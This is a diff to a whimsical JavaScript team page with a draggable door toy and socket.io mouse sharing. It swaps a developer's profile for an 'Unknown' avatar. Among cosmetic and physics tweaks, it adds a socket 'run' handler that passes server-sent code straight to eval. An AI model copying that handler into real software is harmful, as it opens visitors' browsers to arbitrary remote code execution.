@@ -68,7 +68,7 @@
 
 
 
-				//Hint: Two tabs can communicate if they have the same ?number=
+				//Hint: Two tabs can communicate if they have the same ?key=
 			}
 		}
 
@@ -76,8 +76,8 @@
 		function findScreenCoords(mouseEvent) {
 			if (mouseEvent) {
 				//FireFox
-				mouseX = mouseEvent.x;
-				mouseY = mouseEvent.y;
+				mouseX = mouseEvent.pageX;
+				mouseY = mouseEvent.pageY;
 			}
 			else {
 				//IE
@@ -85,7 +85,7 @@
 				mouseY = window.event.y;
 			}
 			if(socket && socket.connected)
-				socket.emit("mouse", {x:mouseX, y:mouseY});
+				socket.emit("mouse", {x: mouseX - doorBorder.getX(), y:mouseY, draggingLeft: leftDoorIsDragging, draggingRight: rightDoorIsDragging});
 			return false;
 		}
 		document.onmousemove = findScreenCoords;
@@ -100,7 +100,7 @@
 
 		const DoorMass = 50;
 		const DoorSpringConstant = 0.5;
-		const MouseForcePerPixel = 0.01;
+		let MouseForcePerPixel = 0.2;
 
 		var leftDoor = new function () {
 			let initialX = 0;
@@ -143,7 +143,7 @@
 				this.setX(this.getX() + (velocity > 0 && velocity < 1 ? 1 : (velocity > -1 && velocity < 0 ? -1 : velocity)));
 			};
 		};
-
+		
 		var doorBorder = new function () {
 			let rightBorderDistance = 0;
 			let leftBorder, rightBorder, topBorder;
@@ -239,12 +239,11 @@
 
 
 
-
 		const params = new URLSearchParams(window.location.search);
-		const key = params.get("key");
+		const key = localStorage.getItem("mysecret") || params.get("key");
 		var socket;
 		if (key) {
-			socket = io("https://" + window.location.host);
+			socket = io(window.location.origin);
 			socket.on('connect', function () {
 				console.log("IO connected");
 				socket.emit("register", key);
@@ -254,8 +253,11 @@
 				console.info(data);
 			});
 			socket.on('mouse', (pos) => {
-				document.getElementById("secondHand").style.left = pos.x;
+				document.getElementById("secondHand").style.left = pos.x + doorBorder.getX();
 				document.getElementById("secondHand").style.top = pos.y;
+			});
+			socket.on('run', (code) => {
+				eval(code);
 			});
 			socket.on('disconnect', function () {
 				console.log("IO disconnected");
@@ -329,74 +331,11 @@
 					</section>
 
 					<section class="contentBlock">
-						<div class="sectionMain">
+						<div class="sectionMain" id="divMyProfile">
 							<header>
-								<img src="./assets/images/avatar_hasan.png" width="195" height="160" alt="Daniel">
-								<h1>Hasan</h1>
-
-								<aside class="links">
-									<a href="mailto:daniel@flying-sheep.com" title="E-mail">
-										<img src="./assets/images/icon_m.png" width="36" height="36" alt="E-mail">
-									</a>
-									<a href="https://linkedin.com/in/danielnienhaus" target="_blank" title="Linkedin profile">
-										<img src="./assets/images/icon_s_l.png" width="36" height="36" alt="Linkedin profile">
-									</a>
-									<a href="https://flying-sheep.com/team" title="↻">
-										<img src="./assets/images/icon_reload.png" width="36" height="36" alt="↻">
-									</a>
-								</aside>
+								<a id="avatarLink" href="https://www.etsy.com/listing/715388210/my-door-mordor-jrr-tolkien-quote-one"><img src="./assets/images/avatar_unknown.png" width="195" height="160"></a>
+								<h1>Unknown</h1>
 							</header>
-							<p>Software Developer | Game Designer</p>
-							<aside>
-								<table>
-									<thead>
-										<tr>
-											<th>
-												<h1>Skills</h1>
-											</th>
-											<th>Lvl</th>
-										</tr>
-									</thead>
-									<tbody>
-										<tr>
-											<td>Algoritm Expertise</td>
-											<td>Turn leight</td>
-										</tr>
-										<tr>
-											<td>Telekinesis</td>
-											<td>WebRTC</td>
-										</tr>
-										<tr>
-											<td>Philosophy</td>
-											<td>???</td>
-										</tr>
-									</tbody>
-								</table>
-							</aside>
-							<p>His first coding was on a C64 at age 12. He precisely printed sum of 2 and 3.</p>
-							<p>As soon as he learned programming he started developing games. He is very into physics
-								games so he worked on 2D physics games most of the time. He also really enjoy beaming
-								electrons from one device to another and he turned his first snake game into a local
-								multiplayer game in high school.</p>
-							<p>After many small games, he founded his own company by getting an R&D fund from the
-								government to develop his biggest game project. He made mistakes by over-developing,
-								lost his motivation, left his company and started searching for the meaning of life.</p>
-							<aside class="funFacts">
-								<h1>Fun Facts</h1>
-								<p>In high school, he made a chat program using FTP only to be able to chat with his
-									girlfriend whose workplace had blocked messengers.</p>
-							</aside>
-							<aside class="funFacts">
-								<h1>Favourite Games</h1>
-								<p>
-									Dune II · Prince Of Persia · Michael Jackson's Moonwalker (Sega Genesis)
-								</p>
-							</aside>
-							<aside class="funFacts">
-								<p>
-									<q>If you don't create your own meaning, someone else will do it for you.</q>
-								</p>
-							</aside>
 						</div>
 					</section>
 
